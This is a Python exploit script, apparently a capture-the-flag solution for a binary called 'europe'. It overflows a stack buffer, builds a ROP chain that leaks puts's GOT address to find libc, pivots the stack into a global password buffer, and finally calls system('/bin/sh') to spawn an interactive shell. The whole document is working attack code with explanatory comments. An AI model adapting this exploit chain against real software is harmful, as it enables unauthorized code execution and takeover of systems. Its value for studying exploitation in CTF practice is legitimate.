from zio import *
import time

def xor(s):
    return ''.join(chr(ord(x) ^ 0x20) for x in s)

p = u = l32

f = zio("./europe", timeout = 9999)

f.read_until(" > ")

f.write('1\nguest\nguest\n')
f.read_until(" > ")

f.write('1\n')

# The "see the message" function used in europe02 does not bound the
# copy of loggedin_user into the stack buffer. For the final flag, we
# exploit this to get a shell.

puts = 0x80487F0
puts_got = 0x804A14C
pop_ebp_ret = 0x8049073
leave_ret = 0x8048710
do_it_again = 0x08048DA8

password = 0x804B560
new_ebp = password + 2000

# Normal stack buffer overflow, but we need to be a little careful to
# properly overwrite the index in our copying loop.
payload = 'A' * 0x5e0

# LSB of index variable, set it to 0xe3 to skip over the rest of it.
payload += '\xe3'

payload += 'A' * (0xf - 4)

# Saved ebp
payload += p(password)

# ROP which prints out puts's got entry, and pivots the stack into the
# global password buffer.
payload += p(puts)
payload += p(pop_ebp_ret)
payload += p(puts_got)
payload += p(pop_ebp_ret)
payload += p(password)
payload += p(leave_ret)

payload += '\x20'

f.write(xor(payload) + '\n')
time.sleep(1)

# The stack is moved here with a leave; ret gadget. We return to a point
# inside the command loop function that allows us to read/write the
# password field (which is now our stack) again.
password = p(new_ebp)
password += p(do_it_again)
f.write(password + '\n')
f.read_until(" > ")

# Trigger the buffer overflow, then return to start running our ROP.
f.write('3\n')
f.read_until(" > ")
f.write('4\n')

data = f.readline()
print 'data:',data.encode('hex')
puts_addr = u(data[:4])

libc_base = puts_addr - 0x000656A0#0x65440
print 'libc_base =', hex(libc_base)
system = libc_base + 0x0003E800#0x3fc40
binsh = libc_base + 0x0015F9E4#0x15E324

# Now we're back at the menu, but our stack is inside the password
# buffer. Write a call to system("/bin/sh") using the addresses we
# leaked above, and return to get a shell.
f.write('1\n')
f.write('a\n')
new_password = 'a' * 2000 + 'A' * 4
new_password += p(system)
new_password += 'A' * 4
new_password += p(binsh)
f.write(new_password + '\n')

f.write('4\n')
f.interact()